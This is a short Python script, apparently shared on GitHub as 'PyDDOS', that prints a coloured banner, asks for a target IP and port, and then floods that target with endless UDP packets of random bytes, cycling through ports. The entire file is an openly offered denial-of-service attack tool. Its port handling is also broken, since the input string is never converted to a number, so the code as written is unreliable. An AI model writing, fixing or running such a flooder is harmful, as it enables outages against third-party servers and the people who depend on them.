#Made by Leak#5749
#Contributed to github
#Special thanks to NumeX

import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("toilet -fmono12 -F py ddos")
print
print ("\033[96mAuthor   : Leak#5749")
print ("github   :\033[0m \033[95mhttps://github.com/svrnn\033[0m")
print ("\033[96m--Py DDOS \033[0m\033[93mPyDDOS \033[0m")
print ("\033[92m-----> PyDDOS-v1 <-----\033[0m")
time.sleep(1)
print("\033[91m[--\033[0m\033[92m--\033[0m--\033[93m--\033[0m--\033[94m--\033[0m--\033[95m--\033[0m--\033[96m--\033[0m--\033[97m--\033[92m--]")
time.sleep(1)
print("\033[92m> Put Target information\033[0m")
print
ip = input("\033[93m> Target IP\033[0m -> ")
port = input("\033[91m> Server Port\033[0m       -> ")
print
print("\033[93m----- > Waiting for a moment < ----- \033[0m")
time.sleep(2)
print("\033[91m--\033[0m\033[92m--\033[0m--\033[93m--\033[0m--\033[94m--\033[0m--\033[95m--\033[0m--\033[96m--\033[0m--\033[97m--\033[92m--")

print ("\033[91m---- > \033[93mSuccess ddosing..\033[0m \033[91m< ----\033[0m")
print ("\033[95mStarting in 1 sec \033[0m")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("\033[32;1mAttacking Target \033[31;1m%s \033[32;1mwith IP \033[33;1m%s  \033[32;1mwith bytes \033[34;1m%s"%(sent,ip,port))
     if port == 65534:
       port = 1

